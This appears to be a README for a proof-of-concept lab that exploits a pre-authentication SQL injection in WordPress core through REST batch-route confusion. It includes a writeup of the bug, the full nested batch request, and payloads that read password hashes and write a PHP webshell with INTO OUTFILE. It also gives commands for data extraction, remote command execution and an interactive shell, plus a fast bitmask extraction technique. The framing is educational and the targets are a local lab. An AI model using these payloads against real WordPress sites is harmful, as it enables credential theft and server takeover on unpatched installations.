# wp2shell-lab

Educational PoC and lab for **CVE-2026-63030 + CVE-2026-60137**: pre-authentication SQL injection in WordPress core via REST batch-route confusion.

Discovered by Adam Kues (Searchlight Cyber / Assetnote). Fixed in WordPress 6.9.5 / 7.0.2.

## Quick start

```bash
# bring up the vulnerable lab
cd docker && ./setup.sh
cd ..

# detect
python3 -m exploit check http://localhost:8888
python3 -m exploit check http://localhost:8888 --confirm-sqli

# extract data (fast mode, default)
python3 -m exploit extract http://localhost:8888 --preset fingerprint
python3 -m exploit extract http://localhost:8888 --preset users

# extract data (blind mode, for comparison)
python3 -m exploit extract http://localhost:8888 --mode blind --preset fingerprint

# custom SQL query
python3 -m exploit extract http://localhost:8888 --query "SELECT @@version"

# RCE (requires FILE privilege, the lab grants it)
python3 -m exploit rce http://localhost:8888 --cmd "id"
python3 -m exploit rce http://localhost:8888 --cmd "cat /etc/passwd"
python3 -m exploit rce http://localhost:8888 -i   # interactive shell

# proxy through Burp
python3 -m exploit extract http://localhost:8888 --proxy http://127.0.0.1:8080

# tear down
cd docker && ./setup.sh down
```

## Writeup

### Step 1: The batch endpoint is unauthenticated

`POST /wp-json/batch/v1` bundles multiple REST API calls into one HTTP request. It has no auth check of its own. Security is delegated to each sub-request's permission callback.

### Step 2: The desync

`serve_batch_request_v1()` builds two parallel arrays:

- `$matches[]` tracks which handler to **dispatch** each sub-request to
- `$validation[]` tracks whether each sub-request **passed validation**

It indexes both by the same offset during dispatch. The bug: when a sub-request's path fails `wp_parse_url()`, a `WP_Error` is pushed to `$validation` but **not** `$matches`. This shifts `$matches` by one, so each subsequent sub-request gets dispatched to the wrong handler.

### Step 3: Double nesting

The desync is used twice.

**Outer batch.** A `/wp/v2/posts` request carrying an inner batch as its body gets dispatched under the batch handler (self-call). It was validated as a posts request, so the inner `requests` array was never checked against the batch schema. This bypasses the method allowlist and lets inner sub-requests use GET.

**Inner batch.** A `/wp/v2/categories?author_exclude=<SQLI>` request gets dispatched under posts `get_items()`. The categories schema does not define `author_exclude`, so it passes validation untouched. But posts `get_items()` maps it to `WP_Query::author__not_in`, where the value is interpolated raw into SQL.

### Step 4: The SQL injection

The vulnerable `WP_Query` code only sanitized `author__not_in` when it was already an array:

```php
// PRE-FIX (vulnerable)
if (is_array($query_vars['author__not_in'])) {
    $query_vars['author__not_in'] = array_map('absint', ...);  // sanitize
}
$author__not_in = implode(',', (array) $query_vars['author__not_in']);
$where .= " AND post_author NOT IN ($author__not_in) ";        // raw interpolation
```

A string value bypasses the `is_array()` gate entirely. The `(array)` cast wraps it without sanitizing.

### Step 5: What you can do with it

**Read the database** (every affected site):
```
author_exclude = 0) AND (ASCII(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1)) > 80)-- -
```
Boolean oracle: posts returned = true, empty = false. Binary search per character.

**Write files** (requires MySQL FILE privilege, not the WordPress default):
```
author_exclude = 0) AND 1=0 UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/path/shell.php'-- -
```

## The batch desync

The actual HTTP request:

```json
{
  "requests": [
    {"method": "POST", "path": "http://"},
    {"method": "POST", "path": "/wp/v2/posts", "body": {
      "requests": [
        {"method": "POST", "path": "http://"},
        {"method": "POST", "path": "/wp/v2/categories?author_exclude=<SQLI>",
         "body": {"name": "x", "orderby": false}},
        {"method": "GET",  "path": "/wp/v2/posts"}
      ]
    }},
    {"method": "POST", "path": "/batch/v1"}
  ]
}
```

How the arrays misalign:

`serve_batch_request_v1()` processes sub-requests in two loops. The first
loop validates every sub-request and builds `$matches[]` and `$validation[]`.
The second loop dispatches each sub-request using `$matches[$i]` as the
handler. Because the primer's error is missing from `$matches`, the second
loop pairs each request with the wrong handler.

```
POST /?rest_route=/batch/v1  (anonymous, no auth)
|
v
OUTER BATCH
+--------------------------------------------------------------+
|                                                              |
|  Loop 1 (validate):                                          |
|    [0] "http://"          -> wp_parse_url fails              |
|    [1] POST /wp/v2/posts  -> match: posts_handler            |
|    [2] POST /batch/v1     -> match: batch_handler            |
|                                                              |
|  $validation:  [ error,  OK(posts),     OK(batch)    ]       |
|  $matches:     [         posts_handler, batch_handler ]      |
|                 ^                                            |
|                 error skipped in $matches                    |
|                                                              |
|  Loop 2 (dispatch):                                          |
|    i=0: error -> skip                                        |
|    i=1: POST /posts  uses $matches[1] = batch_handler        |
|         -> posts body executed as a nested batch             |
|    i=2: POST /batch  uses $matches[2] = out of bounds        |
|                                                              |
+--------------------------------------------------------------+
                          |
                          v
INNER BATCH (recursive serve_batch_request_v1)
+--------------------------------------------------------------+
|                                                              |
|  Loop 1 (validate):                                          |
|    [0] "http://"            -> wp_parse_url fails            |
|    [1] POST /categories     -> match: categories_handler     |
|    [2] GET  /wp/v2/posts    -> match: posts_handler          |
|                                                              |
|  $validation:  [ error,  OK(cats),         OK(posts)    ]    |
|  $matches:     [         categories_handler, posts_handler ] |
|                                                              |
|  Loop 2 (dispatch):                                          |
|    i=0: error -> skip                                        |
|    i=1: POST /categories uses $matches[1] = posts_handler    |
|         -> categories request handled by posts get_items()   |
|         -> author_exclude not in cats schema, unsanitized    |
|         -> posts maps it to WP_Query::author__not_in         |
|         -> SQL INJECTION                                     |
|                                                              |
+--------------------------------------------------------------+
```

## Fast extraction via X-WP-Total bitmask oracle

Existing PoCs use blind boolean extraction: 1 bit per HTTP request, roughly 224 requests for a password hash. This repo combines two techniques for ~75x faster extraction.

**X-WP-Total oracle.** WordPress adds `SQL_CALC_FOUND_ROWS` to post queries and puts the count in the `X-WP-Total` response header. UNION rows are counted at the SQL level even though PHP filters them from the response body. Conditional UNIONs encode individual bits:

```sql
0) AND 1=0
UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 1) > 0   -- bit 0
UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 2) > 0   -- bit 1
...                                                            -- bits 2-6
-- -
```

`X-WP-Total` = 0 means bit not set, 1 means bit set. Seven probes = one full ASCII character.

**Unlimited inner batch.** The outer batch validates `maxItems: 25` via its schema. The route confusion bypasses this: the inner batch runs recursively with no size check. All 7 bit-probes for multiple characters pack into one request.

16 chars x 7 bits = 112 probes per request. A 34-char phpass hash in ~3 requests instead of ~224.

## References

- [WordPress 7.0.2 release](https://wordpress.org/news/2026/07/wordpress-7-0-2-release/)
- [Searchlight Cyber advisory](https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core)
- [GHSA-ff9f-jf42-662q](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q) (route confusion)
- [GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf) (SQLi)
- [Icex0/wp2shell-poc](https://github.com/Icex0/wp2shell-poc) - blind SQLi + post-auth webshell
- [AdnaneKhan/Wp2Shell-RCE](https://github.com/AdnaneKhan/Wp2Shell-RCE) - INTO OUTFILE RCE with Docker lab
- [sergiointel/wp2shell-poc](https://github.com/sergiointel/wp2shell-poc) - minimal timing-based PoC

## Legal

For authorized security testing and education only. Use exclusively against systems you own or have explicit written permission to test.
